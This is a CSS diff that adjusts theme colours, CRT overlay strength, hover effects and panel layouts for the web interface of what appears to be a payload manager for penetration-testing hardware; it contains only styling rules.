@@ -21,9 +21,9 @@
   --red:#ff1a1a;--red-dim:#cc3333;--red-glow:rgba(255,26,26,0.15);
   --green:#00ff88;--green-dim:#33cc88;
   --cyan:#00e5ff;--yellow:#ffd700;--magenta:#ff00ff;--blue:#4488ff;
-  --bg:#030308;--bg2:#07070f;--bg3:#0a0a18;
-  --border:#2a2a4a;--border-bright:#3a3a6a;
-  --text:#b0b0cc;--text-bright:#e8e8f8;
+  --bg:#060610;--bg2:#0c0c18;--bg3:#101022;
+  --border:#34345a;--border-bright:#4a4a78;
+  --text:#c8c8e0;--text-bright:#f2f2ff;
   --mono:'Share Tech Mono',monospace;
   --display:'Orbitron',monospace;
   --device-accent:#ffd700;
@@ -32,60 +32,63 @@
   --accent-hover:#ff4444;
   --accent-glow-1:rgba(255,26,26,0.30);--accent-glow-2:rgba(255,26,26,0.12);
   --accent-glow-3:rgba(255,26,26,0.65);--accent-glow-4:rgba(255,26,26,0.30);
-  --preview-text:#c8c8d8;--preview-comment:#7a7a9a;
-  /* CRT overlay */
-  --scanline-color:rgba(0,0,0,0.10);
-  --vignette-mid:rgba(0,0,0,0.35);
-  --vignette-edge:rgba(0,0,0,0.72);
-  --phosphor-tint:rgba(0,255,60,0.022);
-  --crt-opacity:1;
+  --preview-text:#d8d8ec;--preview-comment:#9090b0;
+  /* CRT overlay - lighter vignette for readability */
+  --scanline-color:rgba(0,0,0,0.07);
+  --vignette-mid:rgba(0,0,0,0.18);
+  --vignette-edge:rgba(0,0,0,0.48);
+  --phosphor-tint:rgba(0,255,60,0.016);
+  --crt-opacity:0.85;
 }
 
 /* ── THEME: PUSHED ── sharper contrast, still readable ── */
 body[data-theme="pushed"]{
-  --bg:#060612;--bg2:#0c0c1c;--bg3:#101028;
-  --border:#32325a;--border-bright:#5050a0;
-  --text:#c8c8e0;--text-bright:#f8f8ff;
-  --preview-text:#d8d8ec;--preview-comment:#8888aa;
-  --scanline-color:rgba(0,0,0,0.14);
-  --vignette-mid:rgba(0,0,0,0.28);
-  --vignette-edge:rgba(0,0,0,0.58);
+  --bg:#0a0a16;--bg2:#101024;--bg3:#141430;
+  --border:#3e3e68;--border-bright:#5858a0;
+  --text:#d4d4ec;--text-bright:#ffffff;
+  --preview-text:#e4e4f8;--preview-comment:#9898b8;
+  --scanline-color:rgba(0,0,0,0.09);
+  --vignette-mid:rgba(0,0,0,0.14);
+  --vignette-edge:rgba(0,0,0,0.42);
+  --crt-opacity:0.8;
 }
 
 /* ── THEME: MATRIX ── green phosphor terminal ── */
 body[data-theme="matrix"]{
   --red:#00ff41;--red-dim:#00cc35;--red-glow:rgba(0,255,65,0.15);
   --green:#00ff88;--cyan:#00ffc8;--yellow:#80ff20;--magenta:#00ff99;
-  --bg:#000800;--bg2:#001200;--bg3:#001c08;
-  --border:#0e3a14;--border-bright:#1a6020;
-  --text:#00c838;--text-bright:#00ff55;
+  --bg:#001000;--bg2:#001800;--bg3:#002210;
+  --border:#126028;--border-bright:#1e7830;
+  --text:#00e048;--text-bright:#00ff66;
   --device-accent:#00ff41;
   --accent:#00ff55;--accent-fg:#001a06;--accent-hover:#00dd44;
   --accent-glow-1:rgba(0,255,85,0.35);--accent-glow-2:rgba(0,255,85,0.15);
   --accent-glow-3:rgba(0,255,85,0.70);--accent-glow-4:rgba(0,255,85,0.35);
-  --preview-text:#00ee50;--preview-comment:#007a28;
-  --scanline-color:rgba(0,20,0,0.18);
-  --vignette-mid:rgba(0,8,0,0.30);
-  --vignette-edge:rgba(0,4,0,0.65);
-  --phosphor-tint:rgba(0,255,0,0.035);
+  --preview-text:#00ff58;--preview-comment:#00a838;
+  --scanline-color:rgba(0,20,0,0.12);
+  --vignette-mid:rgba(0,8,0,0.20);
+  --vignette-edge:rgba(0,4,0,0.50);
+  --phosphor-tint:rgba(0,255,0,0.028);
+  --crt-opacity:0.82;
 }
 
 /* ── THEME: CINEMATIC ── warm red/black, brighter text ── */
 body[data-theme="cinematic"]{
   --red:#ff3030;--red-dim:#cc2020;--red-glow:rgba(255,48,48,0.20);
   --yellow:#ffaa00;--cyan:#ff5588;--magenta:#ff2266;
-  --bg:#0c0202;--bg2:#140404;--bg3:#1c0606;
-  --border:#4a1818;--border-bright:#6a2828;
-  --text:#f0b0b0;--text-bright:#fff0f0;
+  --bg:#100404;--bg2:#180606;--bg3:#220808;
+  --border:#5a2020;--border-bright:#7a3030;
+  --text:#f8c0c0;--text-bright:#fff8f8;
   --device-accent:#ffaa00;
   --accent:#ff3333;--accent-fg:#ffffff;--accent-hover:#ff5555;
   --accent-glow-1:rgba(255,50,50,0.40);--accent-glow-2:rgba(255,50,50,0.18);
   --accent-glow-3:rgba(255,50,50,0.75);--accent-glow-4:rgba(255,50,50,0.38);
-  --preview-text:#ffe0e0;--preview-comment:#c08080;
-  --scanline-color:rgba(0,0,0,0.16);
-  --vignette-mid:rgba(20,0,0,0.32);
-  --vignette-edge:rgba(10,0,0,0.68);
-  --phosphor-tint:rgba(255,20,0,0.03);
+  --preview-text:#ffe8e8;--preview-comment:#d09090;
+  --scanline-color:rgba(0,0,0,0.10);
+  --vignette-mid:rgba(20,0,0,0.22);
+  --vignette-edge:rgba(10,0,0,0.52);
+  --phosphor-tint:rgba(255,20,0,0.022);
+  --crt-opacity:0.82;
 }
 
 /* ── THEME: LIGHT ── soft slate lab (not blinding white) ── */
@@ -93,14 +96,14 @@ body[data-theme="light"]{
   --red:#b81010;--red-dim:#900c0c;--red-glow:rgba(184,16,16,0.10);
   --green:#006838;--green-dim:#005530;--cyan:#0055aa;
   --yellow:#7a5500;--magenta:#700058;--blue:#1a3a99;
-  --bg:#b8bec8;--bg2:#acb4c0;--bg3:#a0a8b6;
-  --border:#8892a4;--border-bright:#6a7890;
-  --text:#2a3040;--text-bright:#0e1220;
+  --bg:#c4cad4;--bg2:#b8c0cc;--bg3:#acb6c4;
+  --border:#7a8698;--border-bright:#5e6e84;
+  --text:#1e2434;--text-bright:#080c18;
   --device-accent:#7a5500;
   --accent:#b81010;--accent-fg:#ffffff;--accent-hover:#d02020;
   --accent-glow-1:rgba(184,16,16,0.20);--accent-glow-2:rgba(184,16,16,0.08);
   --accent-glow-3:rgba(184,16,16,0.35);--accent-glow-4:rgba(184,16,16,0.18);
-  --preview-text:#1a2030;--preview-comment:#4a5068;
+  --preview-text:#121828;--preview-comment:#3a4058;
   --scanline-color:transparent;
   --vignette-mid:transparent;
   --vignette-edge:transparent;
@@ -113,14 +116,14 @@ body[data-theme="flat"]{
   --red:#d44040;--red-dim:#b03030;--red-glow:transparent;
   --green:#3aaa72;--green-dim:#2e9060;--cyan:#4a9fd8;
   --yellow:#c8a830;--magenta:#b060b0;--blue:#5a80d0;
-  --bg:#2a2e34;--bg2:#32373e;--bg3:#3c424a;
-  --border:#4e5560;--border-bright:#646c78;
-  --text:#b4b8c4;--text-bright:#eceef4;
+  --bg:#32363e;--bg2:#3a4048;--bg3:#444a54;
+  --border:#5a6270;--border-bright:#727a88;
+  --text:#c8ccd8;--text-bright:#f8faff;
   --device-accent:#c8a830;
   --accent:#d44040;--accent-fg:#ffffff;--accent-hover:#e85858;
   --accent-glow-1:transparent;--accent-glow-2:transparent;
   --accent-glow-3:transparent;--accent-glow-4:transparent;
-  --preview-text:#d8dae4;--preview-comment:#7a8090;
+  --preview-text:#e8eaf2;--preview-comment:#9098a8;
   --scanline-color:transparent;
   --vignette-mid:transparent;
   --vignette-edge:transparent;
@@ -192,7 +195,30 @@ body[data-theme="cinematic"] .p-name{color:var(--text-bright);}
 body[data-theme="cinematic"] .hstat,
 body[data-theme="cinematic"] .nav-label{color:var(--text-bright);}
 
-html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono);font-size:14px;}
+/* default + pushed: boost secondary UI text (match flat/light treatment) */
+body:not([data-theme]) .tab,
+body[data-theme="default"] .tab,
+body[data-theme="pushed"] .tab{color:var(--text-bright);opacity:0.82;}
+body:not([data-theme]) .tab.active,
+body[data-theme="default"] .tab.active,
+body[data-theme="pushed"] .tab.active{opacity:1;font-weight:700;}
+body:not([data-theme]) .sys-tile:not(.active),
+body[data-theme="default"] .sys-tile:not(.active),
+body[data-theme="pushed"] .sys-tile:not(.active){opacity:0.94;}
+body:not([data-theme]) .dev-card:not(.active),
+body[data-theme="default"] .dev-card:not(.active),
+body[data-theme="pushed"] .dev-card:not(.active){color:var(--text-bright);opacity:0.88;}
+body:not([data-theme]) #preview-file,
+body[data-theme="default"] #preview-file,
+body[data-theme="pushed"] #preview-file{color:var(--text-bright);font-weight:600;}
+body:not([data-theme]) .p-name,
+body[data-theme="default"] .p-name,
+body[data-theme="pushed"] .p-name{color:var(--text-bright);}
+body:not([data-theme]) .repo-missing,
+body[data-theme="default"] .repo-missing,
+body[data-theme="pushed"] .repo-missing{color:var(--text);}
+
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono);font-size:15px;}
 
 /* ── SCANLINES + PHOSPHOR VIGNETTE ───────────────────────────────────────── */
 body::before{
@@ -346,7 +372,6 @@ body::after{
   #login-logo::after{
     animation:logo-glitch-bottom 6.5s linear 1.2s infinite alternate-reverse !important;
   }
-  #nav::before{animation:none;opacity:0;}
   .sys-tile-key,.dev-card-key{animation:none;opacity:1;text-shadow:none;box-shadow:none;}
 }
 #login-subtitle{
@@ -389,7 +414,7 @@ body::after{
   caret-color:var(--green);
 }
 .login-input:focus{border-color:var(--red-dim);}
-.login-input::placeholder{color:#5a5a7a;}
+.login-input::placeholder{color:#7878a0;}
 
 #login-user-select{
   width:100%;padding:8px 12px;
@@ -615,22 +640,6 @@ body[data-theme="light"] #login-btn:disabled{background:#ddd;color:#aaa;}
   position:relative;isolation:isolate;
 }
 #nav::-webkit-scrollbar{display:none;}
-#nav::after{
-  content:'';position:absolute;left:0;top:0;bottom:0;width:1px;
-  background:linear-gradient(180deg,transparent 0%,rgba(255,26,26,0.18) 25%,rgba(255,26,26,0.28) 50%,rgba(255,26,26,0.18) 75%,transparent 100%);
-  pointer-events:none;z-index:0;
-}
-#nav::before{
-  content:'';position:absolute;left:0;width:56px;height:2px;
-  background:linear-gradient(90deg,rgba(255,26,26,0.75) 0%,rgba(255,26,26,0.2) 42%,transparent 100%);
-  box-shadow:0 0 10px rgba(255,26,26,0.45),0 0 22px rgba(255,26,26,0.12);
-  pointer-events:none;z-index:0;opacity:0.55;
-  animation:nav-side-scan 7s ease-in-out infinite alternate;
-}
-@keyframes nav-side-scan{
-  0%{top:12%;}
-  100%{top:88%;}
-}
 #nav > .nav-section,
 #nav > .sys-grid,
 #nav > #device-list{position:relative;z-index:1;}
@@ -666,9 +675,15 @@ body[data-theme="light"] #login-btn:disabled{background:#ddd;color:#aaa;}
   transition:border-color 0.15s,box-shadow 0.15s,background 0.15s;
   user-select:none;
 }
-.sys-tile:hover{
-  border-color:var(--border-bright);
-  background:rgba(255,255,255,0.04);
+.sys-tile:hover:not(.active){
+  border-color:color-mix(in srgb,var(--tile-accent,var(--cyan)) 50%,var(--border-bright));
+  background:color-mix(in srgb,var(--tile-accent,var(--cyan)) 10%,rgba(255,255,255,0.04));
+  box-shadow:inset 0 0 14px color-mix(in srgb,var(--tile-accent,var(--cyan)) 6%,transparent);
+}
+.sys-tile.active:hover{
+  background:color-mix(in srgb,var(--tile-accent,var(--cyan)) 11%,transparent);
+  border-color:color-mix(in srgb,var(--tile-accent,var(--cyan)) 55%,var(--border));
+  box-shadow:0 0 16px color-mix(in srgb,var(--tile-accent,var(--cyan)) 26%,transparent);
 }
 .sys-tile.active{
   border-color:var(--tile-accent,var(--cyan));
@@ -700,13 +715,23 @@ body[data-theme="light"] #login-btn:disabled{background:#ddd;color:#aaa;}
 
 .dev-card{
   display:flex;align-items:center;gap:10px;
-  margin:0 12px 8px;padding:10px 12px;
+  margin:0 12px 8px;padding:0 12px;
+  height:58px;min-height:58px;box-sizing:border-box;
   border:1px solid var(--border);border-radius:4px;
   background:rgba(0,0,0,0.18);cursor:pointer;
   transition:border-color 0.15s,box-shadow 0.15s,background 0.15s;
   user-select:none;
 }
-.dev-card:hover{border-color:var(--border-bright);background:rgba(255,255,255,0.03);}
+.dev-card:hover:not(.active){
+  border-color:color-mix(in srgb,var(--dev-accent,var(--yellow)) 50%,var(--border-bright));
+  background:color-mix(in srgb,var(--dev-accent,var(--yellow)) 10%,rgba(255,255,255,0.03));
+  box-shadow:inset 0 0 16px color-mix(in srgb,var(--dev-accent,var(--yellow)) 6%,transparent);
+}
+.dev-card.active:hover{
+  background:color-mix(in srgb,var(--dev-accent,var(--yellow)) 12%,transparent);
+  border-color:color-mix(in srgb,var(--dev-accent,var(--yellow)) 55%,var(--border));
+  box-shadow:inset 0 0 20px color-mix(in srgb,var(--dev-accent,var(--yellow)) 8%,transparent);
+}
 .dev-card.active{
   border-left:2px solid var(--dev-accent,var(--yellow));
   background:color-mix(in srgb,var(--dev-accent,var(--yellow)) 9%, transparent);
@@ -750,7 +775,7 @@ body[data-theme="light"] #login-btn:disabled{background:#ddd;color:#aaa;}
   white-space:nowrap;
 }
 .dev-card-meta span{font-family:var(--mono);color:var(--text-bright);font-weight:700;}
-.dev-card-status{flex-shrink:0;width:90px;display:flex;justify-content:flex-end;}
+.dev-card-status{flex-shrink:0;width:90px;height:28px;display:flex;align-items:center;justify-content:flex-end;}
 .dev-card[data-device="bunny"]  {--dev-accent:#e8ecf8;}
 .dev-card[data-device="ducky"]  {--dev-accent:var(--yellow);}
 .dev-card[data-device="turtle"] {--dev-accent:var(--green);}
@@ -765,8 +790,9 @@ body[data-theme="light"] #login-btn:disabled{background:#ddd;color:#aaa;}
 
 .dev-dot{width:0;height:0;overflow:hidden;position:absolute;opacity:0;}
 .dev-badge{
-  display:inline-block;width:90px;min-width:90px;
-  font-size:10px;padding:5px 3px;border-radius:3px;
+  display:inline-flex;align-items:center;justify-content:center;
+  width:90px;min-width:90px;height:28px;min-height:28px;
+  font-size:10px;line-height:1;padding:0 3px;border-radius:3px;
   font-family:var(--display);letter-spacing:0.5px;
   text-align:center;flex-shrink:0;box-sizing:border-box;
   white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
@@ -781,12 +807,17 @@ body[data-theme="light"] #login-btn:disabled{background:#ddd;color:#aaa;}
 }
 .dev-badge.soon{
   background:rgba(255,0,255,0.08);color:var(--magenta);border:1px solid rgba(255,0,255,0.35);
-  font-size:9px;letter-spacing:0.3px;
+  letter-spacing:0.5px;
 }
 .dev-card--soon{
-  opacity:0.62;cursor:default;pointer-events:auto;
+  opacity:0.72;cursor:default;pointer-events:auto;
 }
-.dev-card--soon:hover{border-color:var(--border);background:rgba(0,0,0,0.18);}
+.dev-card--soon:hover{
+  opacity:0.82;
+  border-color:color-mix(in srgb,var(--dev-accent,var(--magenta)) 42%,var(--border));
+  background:color-mix(in srgb,var(--dev-accent,var(--magenta)) 8%,rgba(0,0,0,0.18));
+  box-shadow:inset 0 0 14px color-mix(in srgb,var(--dev-accent,var(--magenta)) 5%,transparent);
+}
 .dev-card--soon .dev-card-key{animation:none;opacity:0.7;}
 .dev-card.dev-armed-card{
   border-color:var(--red);
@@ -831,7 +862,7 @@ body.defcon34-mode #tsk-logo{
 #search-wrap{
   display:flex;align-items:center;gap:8px;
   background:var(--bg3);border:1px solid var(--border-bright);
-  border-radius:4px;padding:4px 10px;
+  border-radius:4px;padding:0 10px;
   margin-left:auto;
   flex:0 1 220px;min-width:150px;max-width:300px;
 }
@@ -841,7 +872,7 @@ body.defcon34-mode #tsk-logo{
   width:100%;min-width:0;caret-color:var(--green);
   line-height:1;padding:0;margin:0;
 }
-#search-input::placeholder{color:#6a6a8a;font-style:italic;font-size:12px;}
+#search-input::placeholder{color:#8080a8;font-style:italic;font-size:12px;}
 .search-icon{color:var(--border-bright);font-size:12px;flex-shrink:0;}
 #payload-scroll{flex:1;overflow-y:auto;}
 .panel-head{
@@ -879,26 +910,51 @@ body.defcon34-mode #tsk-logo{
   box-shadow:0 0 12px color-mix(in srgb,var(--device-accent) 50%,transparent),
              0 0 22px color-mix(in srgb,var(--device-accent) 22%,transparent);
 }
+.browse-header-ctl{
+  height:30px;box-sizing:border-box;
+  display:inline-flex;align-items:center;justify-content:center;
+  flex-shrink:0;line-height:1;
+}
 .browse-new-payload-btn{
   font-family:var(--display);font-size:10px;letter-spacing:2px;
-  padding:5px 10px;border:1px solid var(--green);border-radius:3px;
+  padding:0 10px;border:1px solid var(--green);border-radius:4px;
   background:rgba(0,255,136,0.08);color:var(--green);cursor:pointer;
-  flex-shrink:0;
 }
 .browse-new-payload-btn:hover{background:rgba(0,255,136,0.15);}
 .snarf-header-btn{
   font-family:var(--display);font-size:10px;letter-spacing:2px;
-  padding:5px 10px;border:1px solid var(--cyan);border-radius:3px;
+  padding:0 10px;border:1px solid var(--cyan);border-radius:4px;
   background:rgba(0,229,255,0.08);color:var(--cyan);cursor:pointer;
-  flex-shrink:0;
 }
 .snarf-header-btn:hover{background:rgba(0,229,255,0.15);}
-.p-item-delete{
+.lhost-header-chip{
+  font-family:var(--mono);font-size:13px;font-weight:600;letter-spacing:0.5px;
+  line-height:1;padding:0 12px;white-space:nowrap;
+  border:1px solid var(--border-bright);border-radius:4px;
+  background:rgba(255,255,255,0.05);color:var(--text-bright);cursor:pointer;
+  appearance:none;-webkit-appearance:none;
+  transition:border-color 0.15s,color 0.15s,background 0.15s,box-shadow 0.15s;
+}
+.lhost-header-chip:hover{
+  border-color:var(--cyan);color:var(--cyan);
+  background:rgba(0,229,255,0.08);
+  box-shadow:0 0 10px rgba(0,229,255,0.12);
+}
+.lhost-header-chip.unset{
+  font-family:var(--display);font-size:10px;letter-spacing:2px;font-weight:400;
+  color:#ffaa00;border-color:rgba(255,170,0,0.45);
+  background:rgba(255,170,0,0.06);
+}
+.lhost-header-chip.unset:hover{color:#ffcc55;border-color:#ffaa00;background:rgba(255,170,0,0.1);}
+.p-item-delete,
+.p-item-rename{
   font-size:11px;padding:2px 8px;border:1px solid var(--border);border-radius:3px;
   color:var(--text);background:transparent;cursor:pointer;flex-shrink:0;
   font-family:var(--display);letter-spacing:1px;line-height:1.4;
 }
 .p-item-delete:hover{border-color:var(--red);color:var(--red);}
+.p-item-rename:hover{border-color:var(--cyan);color:var(--cyan);}
+.p-lure-victim{font-size:11px;color:var(--text);margin-left:6px;font-weight:400;}
 .browse-sticky-title .cfg-title,
 .panel-head .cfg-title{margin-bottom:0;line-height:1;}
 #center-source{
@@ -923,22 +979,6 @@ body.defcon34-mode #tsk-logo{
   background:rgba(255,255,255,0.03);
 }
 .center-payload-badge.is-hidden{display:none;}
-#lhost-chip{
-  font-size:10px;letter-spacing:0.5px;font-family:var(--mono);
-  padding:4px 8px;border:1px solid var(--border);border-radius:3px;
-  background:rgba(0,0,0,0.28);cursor:pointer;white-space:nowrap;flex-shrink:0;
-  color:var(--text-bright);line-height:1;
-  transition:border-color 0.15s,color 0.15s,box-shadow 0.15s;
-}
-#lhost-chip:hover{
-  border-color:var(--cyan);color:var(--cyan);
-  box-shadow:0 0 10px rgba(0,229,255,0.12);
-}
-#lhost-chip.unset{
-  font-family:var(--display);font-size:9px;letter-spacing:1.5px;
-  color:#ffaa00;border-color:rgba(255,170,0,0.45);
-}
-#lhost-chip.unset:hover{color:#ffcc55;border-color:#ffaa00;}
 .payload-banner{
   margin:12px 20px;padding:14px 16px;
   background:color-mix(in srgb, var(--device-accent) 9%, var(--bg2));
@@ -960,7 +1000,7 @@ body.defcon34-mode #tsk-logo{
 #payload-scroll::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px;}
 #payload-list{padding:4px 0;}
 .snarf-head{font-family:var(--display);font-size:13px;letter-spacing:3px;color:var(--cyan);margin-bottom:6px;font-weight:700;}
-.snarf-sub{font-size:14px;color:var(--text-bright);margin-bottom:16px;line-height:1.55;}
+.snarf-sub{font-size:14px;color:var(--text-bright);margin-bottom:16px;line-height:1.55;flex-shrink:0;}
 .snarf-mascot{float:right;height:158px;width:auto;margin:0 0 8px 20px;image-rendering:pixelated;opacity:0.92;pointer-events:none;}
 .snarf-section{margin-bottom:20px;}
 .snarf-label{font-family:var(--display);font-size:12px;letter-spacing:2px;color:var(--text-bright);margin-bottom:10px;font-weight:700;}
@@ -969,23 +1009,37 @@ body.defcon34-mode #tsk-logo{
 .snarf-check:hover{border-color:rgba(0,229,255,0.35);}
 .snarf-check input{margin-top:3px;accent-color:var(--cyan);width:15px;height:15px;flex-shrink:0;}
 .snarf-check small{display:block;color:var(--text);font-size:12px;margin-top:4px;line-height:1.4;}
-.snarf-row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:12px;}
+.snarf-row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px;}
+.snarf-row--output .snarf-select.snarf-field-grow{flex:1 1 260px;min-width:220px;max-width:100%;}
+.snarf-row--output .snarf-select.snarf-field-format{flex:0 1 210px;min-width:170px;}
+.snarf-row--output .snarf-input.snarf-field-name{flex:0 0 150px;width:150px;}
+.snarf-row--inline{margin-bottom:0;}
 .snarf-select,.snarf-input{
   background:var(--bg);border:1px solid var(--border);color:var(--text-bright);
-  font-family:var(--mono);font-size:14px;padding:8px 12px;border-radius:4px;line-height:1.4;
+  font-family:var(--mono);font-size:13px;padding:0 12px;border-radius:4px;line-height:1.35;
+  height:40px;box-sizing:border-box;min-width:0;
 }
 .snarf-select:focus,.snarf-input:focus{outline:none;border-color:var(--cyan);}
+.snarf-check--compact{display:inline-flex;align-items:center;padding:8px 12px;margin:0;}
+.snarf-check--compact input{margin-top:0;}
+.snarf-lhost-line{font-size:13px;color:var(--text);margin-top:8px;line-height:1.45;}
+.snarf-lhost-line .snarf-lhost-val{color:var(--red);font-family:var(--mono);}
 .snarf-warn{font-size:13px;color:#ffaa00;margin-top:10px;line-height:1.5;}
-.snarf-actions{display:flex;gap:10px;margin-top:4px;flex-wrap:wrap;flex-shrink:0;}
+.snarf-actions{display:flex;gap:10px;margin-top:0;flex-wrap:wrap;align-items:center;flex-shrink:0;}
 .snarf-btn{
-  font-family:var(--display);font-size:12px;letter-spacing:2px;
-  padding:10px 16px;border:1px solid var(--cyan);background:rgba(0,229,255,0.08);
+  font-family:var(--display);font-size:11px;letter-spacing:1.5px;
+  display:inline-flex;align-items:center;justify-content:center;gap:6px;
+  min-height:40px;padding:0 16px;box-sizing:border-box;white-space:nowrap;
+  border:1px solid var(--cyan);background:rgba(0,229,255,0.08);
   color:var(--cyan);cursor:pointer;border-radius:4px;
 }
 .snarf-btn:hover{background:rgba(0,229,255,0.15);}
 .snarf-btn.primary{background:var(--accent);color:var(--accent-fg);border-color:var(--accent);font-weight:700;}
 .snarf-btn.primary:hover{filter:brightness(1.1);}
-.snarf-intro-row{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px;margin-bottom:18px;}
+.snarf-intro-row{
+  display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px;margin-bottom:18px;
+  flex-shrink:0;
+}
 .snarf-intro-card{
   display:flex;flex-direction:column;align-items:center;text-align:center;
   min-width:0;min-height:172px;
@@ -1001,27 +1055,60 @@ body.defcon34-mode #tsk-logo{
   min-height:52px;
 }
 .snarf-mode-panel{
-  min-height:420px;display:flex;flex-direction:column;
+  flex:0 0 auto;overflow:visible;
+  display:flex;flex-direction:column;
   border:1px solid var(--border);border-radius:5px;
-  background:rgba(0,0,0,0.18);padding:18px 20px;margin-bottom:16px;
+  background:rgba(0,0,0,0.18);padding:16px 18px;margin-bottom:12px;
 }
-.snarf-mode-panel .snarf-section:last-child{margin-bottom:0;}
-.snarf-mode-panel .snarf-catch-wrap{flex:1;min-height:0;margin-bottom:0;}
-.snarf-mode-spacer{flex:1;min-height:12px;}
-.snarf-build-preview{margin-top:16px;}
-.snarf-build-preview .snarf-preview-panel{max-height:280px;margin-top:8px;}
+.snarf-mode-panel .snarf-section:last-of-type{margin-bottom:0;}
+.snarf-mode-panel .snarf-catch-wrap{flex:0 0 auto;margin-bottom:0;}
+.snarf-mode-panel--catch{
+  overflow:visible;margin-bottom:8px;
+}
+.snarf-mode-spacer{display:none;}
+.snarf-build-preview{
+  margin-top:14px;padding-top:14px;
+  border-top:1px solid var(--border);
+}
+.snarf-build-preview .snarf-label{margin-bottom:8px;}
+.snarf-preview-meta{
+  font-size:13px;color:var(--yellow);margin-bottom:8px;
+  line-height:1.45;word-break:break-word;
+}
+.snarf-build-preview .snarf-preview-panel{
+  max-height:min(32vh,240px);margin-top:0;
+}
+.snarf-footer{
+  flex-shrink:0;margin-top:0;padding-top:12px;
+  border-top:1px solid var(--border);
+}
+.snarf-footer .snarf-actions{margin-top:0;}
 .snarf-subtabs{display:flex;gap:8px;margin-bottom:16px;}
 .snarf-subtab{
   font-family:var(--display);font-size:12px;letter-spacing:2px;padding:8px 14px;
   border:1px solid var(--border);background:transparent;color:var(--text);cursor:pointer;border-radius:4px;
 }
 .snarf-subtab.active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,229,255,0.08);}
-.snarf-catch-wrap{display:grid;grid-template-columns:1fr 1fr;gap:16px;min-height:400px;}
-.snarf-catch-col{display:flex;flex-direction:column;min-height:0;min-width:0;}
+.snarf-catch-wrap{display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:start;}
+.snarf-catch-col{display:flex;flex-direction:column;min-width:0;}
+.snarf-catch-col--right{display:flex;flex-direction:column;gap:0;}
+.snarf-catch-files-block{display:flex;flex-direction:column;padding-bottom:6px;}
+.snarf-catch-preview-block{
+  display:flex;flex-direction:column;flex-shrink:0;
+  min-height:200px;padding-top:14px;margin-top:10px;
+  border-top:1px solid var(--border);
+}
+.snarf-catch-preview-block .snarf-catch-title{
+  margin:0 0 10px;flex-shrink:0;line-height:1.2;
+}
 .snarf-catch-feed,.snarf-catch-tree{
   border:1px solid var(--border);border-radius:4px;background:rgba(0,0,0,0.25);
   padding:12px;font-size:13px;line-height:1.5;overflow-y:auto;
-  flex:1;min-height:160px;
+  min-height:240px;max-height:320px;
+}
+.snarf-catch-preview-panel{
+  min-height:140px;max-height:280px;
+  margin-top:0;overflow:auto;
 }
 .snarf-catch-title{font-family:var(--display);font-size:12px;letter-spacing:2px;color:var(--text-bright);margin-bottom:8px;font-weight:700;}
 .snarf-catch-line{padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.04);}
@@ -1035,6 +1122,24 @@ body.defcon34-mode #tsk-logo{
 .snarf-catch-file a:hover{text-decoration:underline;}
 .snarf-catch-empty{color:var(--text);padding:14px 0;font-size:14px;line-height:1.5;}
 .snarf-catch-listen{font-size:12px;color:var(--cyan);margin-bottom:10px;line-height:1.55;}
+.snarf-endpoint-bar{
+  margin-bottom:14px;padding:12px 14px;
+  border:1px solid var(--border);border-radius:4px;
+  background:rgba(0,229,255,0.04);
+}
+.snarf-endpoint-label{
+  font-family:var(--display);font-size:11px;letter-spacing:2px;
+  color:var(--text-bright);margin-bottom:8px;font-weight:700;
+}
+.snarf-endpoint-link{
+  display:inline-block;font-family:var(--mono);font-size:13px;
+  color:var(--cyan);text-decoration:underline;word-break:break-all;line-height:1.45;
+}
+.snarf-endpoint-link:hover{color:var(--text-bright);}
+.snarf-endpoint-link--disabled{
+  color:var(--text);opacity:0.7;text-decoration:none;cursor:not-allowed;
+}
+.snarf-endpoint-hint{font-size:12px;color:var(--text);margin-top:8px;line-height:1.45;}
 .snarf-mini-btn{
   margin-left:6px;padding:3px 8px;font-size:11px;cursor:pointer;
   border:1px solid var(--border);background:transparent;color:var(--text-bright);
@@ -1420,7 +1525,7 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
   font-family:var(--mono);font-size:13px;color:var(--green);
   caret-color:var(--green);
 }
-#cmd-input::placeholder{color:#4a6a4a;font-style:italic;opacity:0.85;}
+#cmd-input::placeholder{color:var(--preview-comment);font-style:italic;opacity:0.92;}
 #music-ticker-wrap{
   flex-shrink:0;display:none;align-items:center;
   padding:0 12px;border-top:1px solid var(--border-bright);
@@ -1439,52 +1544,117 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
 
 /* ── ABOUT / HELP content (shell uses .sys-modal) ─────────────────── */
 .about-brand-row{
-  display:flex;align-items:center;gap:14px;margin-bottom:14px;
+  display:flex;align-items:center;gap:16px;margin-bottom:18px;
 }
 .about-avatar{
-  width:64px;height:64px;border-radius:50%;
-  border:2px solid rgba(0,229,255,0.45);object-fit:cover;flex-shrink:0;
+  width:72px;height:72px;border-radius:50%;
+  border:2px solid rgba(0,229,255,0.5);
+  box-shadow:0 0 20px rgba(0,229,255,0.15);
+  object-fit:cover;flex-shrink:0;
   background:var(--bg3);
 }
 .about-title-main{
-  font-family:var(--display);font-size:22px;letter-spacing:3px;
-  color:var(--cyan);font-weight:700;line-height:1.35;
+  font-family:var(--display);font-size:20px;letter-spacing:2px;
+  color:var(--cyan);font-weight:700;line-height:1.3;
 }
 .about-creator{
-  font-size:14px;color:var(--text-bright);margin-top:6px;font-family:var(--display);letter-spacing:2px;
+  font-size:12px;color:var(--text);margin-top:6px;
+  font-family:var(--mono);letter-spacing:1px;
+}
+.about-creator strong{color:var(--text-bright);font-weight:600;}
+.about-intro-card{
+  background:var(--bg);
+  border:1px solid var(--border);
+  border-radius:6px;
+  padding:14px 16px;
+  margin-bottom:20px;
+  text-align:center;
 }
 .about-lead{
-  color:var(--green);font-size:14px;line-height:1.45;margin-bottom:10px;
+  color:var(--green);
+  font-size:12px;
+  line-height:1.55;
+  margin:0 0 12px;
+  letter-spacing:0.2px;
+  white-space:nowrap;
 }
-.about-devices-line{
-  font-size:14px;color:var(--text-bright);letter-spacing:1px;line-height:1.45;
+.about-devices-row{
